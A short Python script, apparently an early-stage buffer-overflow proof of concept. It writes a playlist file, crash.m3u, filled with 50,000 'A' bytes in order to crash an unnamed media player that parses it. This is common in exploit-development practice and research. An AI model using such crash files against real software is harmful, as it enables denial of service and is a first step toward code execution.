# wetw0rk

file = "crash.m3u"
junk = b"\x41" * 50000

print(f"[*] Writing exploit to {file}")
fp = open(file, "wb")
fp.write(junk)
fp.close()

print("[+] m3u file created successfully")
